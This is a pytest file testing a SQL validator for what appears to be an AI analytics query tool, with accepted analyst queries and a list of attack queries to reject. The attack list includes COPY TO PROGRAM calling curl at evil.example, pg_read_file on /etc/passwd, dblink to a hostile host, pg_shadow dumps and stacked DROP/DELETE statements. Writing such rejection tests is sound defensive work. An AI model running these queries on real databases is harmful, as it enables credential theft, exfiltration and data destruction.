"""The validator must reject every attack and still accept real analyst queries."""

from __future__ import annotations

import pytest

from app.security.sql_validator import SqlValidationError, validate_select

GOOD_QUERIES = [
    "SELECT * FROM analytics.orders LIMIT 5",
    "select count(*) from orders",
    "SELECT date_trunc('month', order_date) AS m, SUM(total_amount) FROM analytics.orders "
    "WHERE status = 'delivered' GROUP BY 1 ORDER BY 1",
    "SELECT r.region_name, SUM(o.total_amount) FROM analytics.orders o "
    "JOIN analytics.regions r USING (region_id) GROUP BY 1",
    "WITH monthly AS (SELECT date_trunc('month', order_date) m, sum(total_amount) s "
    "FROM analytics.orders GROUP BY 1) SELECT m, s, s - lag(s) OVER (ORDER BY m) FROM monthly",
    "SELECT category, round(100.0 * avg(is_returned::int), 1) FROM analytics.order_items i "
    "JOIN analytics.products p USING (product_id) GROUP BY 1",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY total_amount) FROM analytics.orders",
    "SELECT segment, count(*) FILTER (WHERE email IS NULL) FROM analytics.customers GROUP BY 1",
    "SELECT to_char(order_date, 'YYYY-MM'), extract(dow FROM order_date) FROM analytics.orders",
    "SELECT a.customer_id FROM analytics.orders a UNION SELECT customer_id FROM analytics.customers",
    "SELECT corr(price_usd, cost_usd), stddev(price_usd), coalesce(cost_usd, 0) "
    "FROM analytics.products GROUP BY cost_usd",
    "SELECT product_name FROM ANALYTICS.PRODUCTS",
    "SELECT * FROM analytics.orders;",  # a single trailing semicolon is fine
    "SELECT /* comment */ 1 -- trailing",
]


@pytest.mark.parametrize("sql", GOOD_QUERIES)
def test_accepts_legitimate_queries(sql: str) -> None:
    assert validate_select(sql).sql


BAD_QUERIES = {
    # --- writes and DDL ---
    "insert": "INSERT INTO analytics.regions VALUES (9, 'x')",
    "update": "UPDATE analytics.orders SET total_amount = 0",
    "delete": "DELETE FROM analytics.orders",
    "truncate": "TRUNCATE analytics.orders",
    "drop": "DROP TABLE analytics.orders",
    "alter": "ALTER TABLE analytics.orders ADD COLUMN x int",
    "create": "CREATE TABLE analytics.t (x int)",
    "create_as": "CREATE TABLE t AS SELECT * FROM analytics.orders",
    "grant": "GRANT ALL ON analytics.orders TO PUBLIC",
    "comment_on": "COMMENT ON TABLE analytics.orders IS 'x'",
    "copy": "COPY analytics.orders TO PROGRAM 'curl evil.example'",
    "copy_stdout": "COPY (SELECT * FROM analytics.customers) TO STDOUT",
    "do_block": "DO $$ BEGIN DELETE FROM analytics.orders; END $$",
    "call": "CALL some_proc()",
    # --- stacking and smuggling ---
    "stacked": "SELECT 1; DROP TABLE analytics.orders",
    "stacked_comment": "SELECT 1; -- harmless\nDROP TABLE analytics.orders",
    "stacked_block_comment": "SELECT 1 /* ; */; DELETE FROM analytics.orders",
    "dml_cte": "WITH d AS (DELETE FROM analytics.orders RETURNING *) SELECT * FROM d",
    "insert_cte": "WITH i AS (INSERT INTO analytics.regions VALUES (9,'x') RETURNING *) SELECT * FROM i",
    "select_into": "SELECT * INTO newt FROM analytics.orders",
    "for_update": "SELECT * FROM analytics.orders FOR UPDATE",
    "for_share": "SELECT * FROM analytics.orders FOR SHARE",
    # --- session and settings ---
    "set": "SET statement_timeout = 0",
    "set_ro_off": "SET default_transaction_read_only = off",
    "reset": "RESET ALL",
    "set_config": "SELECT set_config('statement_timeout', '0', false)",
    "begin": "BEGIN",
    "commit": "COMMIT",
    "explain": "EXPLAIN ANALYZE SELECT * FROM analytics.orders",
    "show": "SHOW ALL",
    "analyze": "ANALYZE analytics.orders",
    "vacuum": "VACUUM analytics.orders",
    "listen": "LISTEN x",
    # --- other schemas / catalogs ---
    "pg_shadow": "SELECT * FROM pg_shadow",
    "pg_catalog_schema": "SELECT * FROM pg_catalog.pg_user",
    "pg_roles": "SELECT rolname FROM pg_roles",
    "info_schema": "SELECT * FROM information_schema.tables",
    "public_schema": "SELECT * FROM public.schema_migrations",
    "app_schema": "SELECT * FROM app.checkpoints",
    "neon_auth": "SELECT * FROM neon_auth.users_sync",
    "cross_db": "SELECT * FROM otherdb.analytics.orders",
    "join_other_schema": "SELECT * FROM analytics.orders o JOIN public.schema_migrations m ON true",
    "subquery_other_schema": "SELECT * FROM analytics.orders WHERE customer_id IN "
    "(SELECT 1 FROM pg_catalog.pg_class)",
    "unknown_table": "SELECT * FROM secrets",
    "analytics_unknown_table": "SELECT * FROM analytics.secrets",
    "quoted_case_trick": 'SELECT * FROM analytics."Orders"',
    "table_function": "SELECT * FROM generate_series(1, 10)",
    "table_function_pg": "SELECT * FROM pg_ls_dir('/')",
    # --- dangerous functions ---
    "pg_sleep": "SELECT pg_sleep(10)",
    "pg_sleep_in_where": "SELECT * FROM analytics.orders WHERE pg_sleep(5) IS NULL",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "pg_read_file_qualified": "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "dblink": "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)",
    "current_setting": "SELECT current_setting('server_version')",
    "pg_terminate_backend": "SELECT pg_terminate_backend(1)",
    "pg_advisory_lock": "SELECT pg_advisory_lock(1)",
    "query_to_xml": "SELECT query_to_xml('select * from pg_shadow', true, true, '')",
    "nested_bad_function": "SELECT upper(pg_read_file('/x'))",
    # --- malformed / empty ---
    "empty": "",
    "whitespace": "   \n  ",
    "only_comment": "-- nothing here",
    "garbage": "SELEC FROM WHERE ((",
    "nul_byte": "SELECT 1\x00; DROP TABLE x",
    "cte_self_reference_catalog": "WITH pg_shadow AS (SELECT * FROM pg_shadow) SELECT * FROM pg_shadow",
    "cte_self_reference_pg_class": "WITH pg_class AS (SELECT * FROM pg_class) SELECT * FROM pg_class",
    "cte_forward_reference": "WITH a AS (SELECT * FROM pg_user), pg_user AS (SELECT 1) SELECT * FROM a",
    "cte_nested_self_reference": "WITH x AS (SELECT * FROM (SELECT * FROM x) s) SELECT * FROM x",
    "recursive_cte": "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r) SELECT * FROM r",
    "too_long": "SELECT " + ", ".join(["1"] * 20_000),
}


@pytest.mark.parametrize("name", list(BAD_QUERIES))
def test_rejects_attacks(name: str) -> None:
    with pytest.raises(SqlValidationError):
        validate_select(BAD_QUERIES[name])


def test_rejection_messages_help_the_model_fix_the_query() -> None:
    with pytest.raises(SqlValidationError, match="Available tables"):
        validate_select("SELECT * FROM secrets")
    with pytest.raises(SqlValidationError, match="Only SELECT"):
        validate_select("DELETE FROM analytics.orders")
    with pytest.raises(SqlValidationError, match="Exactly one"):
        validate_select("SELECT 1; SELECT 2")


def test_reports_referenced_tables_excluding_ctes() -> None:
    result = validate_select(
        "WITH c AS (SELECT * FROM analytics.orders) SELECT * FROM c JOIN customers USING (customer_id)"
    )
    assert result.tables == {"orders", "customers"}


def test_trailing_semicolon_is_stripped() -> None:
    assert validate_select("SELECT 1 ;").sql == "SELECT 1"


@pytest.mark.parametrize(
    "sql",
    [
        "WITH a AS (SELECT * FROM analytics.orders), b AS (SELECT * FROM a) SELECT * FROM b",
        "WITH a AS (SELECT 1 AS x) SELECT * FROM a JOIN (SELECT * FROM a) s USING (x)",
        "WITH a AS (SELECT * FROM orders) SELECT * FROM a UNION ALL SELECT * FROM a",
        "SELECT * FROM (WITH inner_q AS (SELECT * FROM analytics.orders) SELECT * FROM inner_q) t",
        "WITH orders AS (SELECT * FROM analytics.orders WHERE status = 'delivered') SELECT * FROM orders",
    ],
)
def test_legitimate_cte_scoping_is_accepted(sql: str) -> None:
    assert validate_select(sql).sql
